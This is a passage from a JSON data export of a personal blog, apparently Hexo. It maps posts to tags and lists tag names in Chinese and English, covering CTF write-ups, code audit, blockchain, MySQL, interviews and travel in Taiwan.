001q21vwiovjqgbl","tag_id":"ck6rlh7tn000q21vwj5hh4zyq","_id":"ck6rlh7u9001t21vwkih8r6fi"},{"post_id":"ck6rlh7u7001q21vwiovjqgbl","tag_id":"ck6rlh7tp000v21vw70n8gpal","_id":"ck6rlh7u9001v21vw2e73gylc"},{"post_id":"ck6ryi94m00037vvwnxkm8z4d","tag_id":"ck6rlh7u8001r21vw80iklvkd","_id":"ck6ryi94o00047vvwtcokopnn"},{"post_id":"ck6ryi94m00037vvwnxkm8z4d","tag_id":"ck6rlh7u9001u21vwttpxugjo","_id":"ck6ryi94o00057vvwx8cit4pq"},{"post_id":"ck6rlh7tf000521vwher3kpxd","tag_id":"ck6rlh7td000321vwtswdwr8w","_id":"ck6szxxlg0000eovwrezuewsy"},{"post_id":"ck6rlh7tf000521vwher3kpxd","tag_id":"ck6rlh7tm000l21vwvh22wroo","_id":"ck6szxxlg0001eovwbfqz6gjh"},{"post_id":"ck6rlh7tf000521vwher3kpxd","tag_id":"ck6rlh7tn000o21vwtd0wrg9l","_id":"ck6szxxlg0002eovwhu5vslw2"}],"Tag":[{"name":"区块链","_id":"ck6rlh7td000321vwtswdwr8w"},{"name":"CTF","_id":"ck6rlh7ti000721vwk33xxk3k"},{"name":"writeup","_id":"ck6rlh7tk000a21vwu9camvh9"},{"name":"服务器","_id":"ck6rlh7tl000b21vw2y8m1t8y"},{"name":"nginx","_id":"ck6rlh7tl000e21vwa5ed4wic"},{"name":"淘宝店","_id":"ck6rlh7tm000g21vw3lu2xd2m"},{"name":"SQL","_id":"ck6rlh7tm000j21vw2ihq7mlv"},{"name":"面试","_id":"ck6rlh7tm000k21vw8j7cfgmd"},{"name":"go","_id":"ck6rlh7tm000l21vwvh22wroo"},{"name":"代码审计","_id":"ck6rlh7tn000o21vwtd0wrg9l"},{"name":"ctf","_id":"ck6rlh7tn000q21vwj5hh4zyq"},{"name":"天枢","_id":"ck6rlh7tp000v21vw70n8gpal"},{"name":"智能合约","_id":"ck6rlh7tp000w21vwxgky74k5"},{"name":"MySQL","_id":"ck6rlh7tp000x21vw8j9f5h2g"},{"name":"笔试题","_id":"ck6rlh7tq001021vw0zp3uwvo"},{"name":"小程序","_id":"ck6rlh7tq001321vw29agp7oa"},{"name":"天天种树","_id":"ck6rlh7tr001621vwlle4w9w6"},{"name":"python","_id":"ck6rlh7u5001g21vwqtndv561"},{"name":"台湾","_id":"ck6rlh7u8001r21vw80iklvkd"},{"name":"游记","_id":"ck6rlh7u9001u21vwttpxugjo"}]}}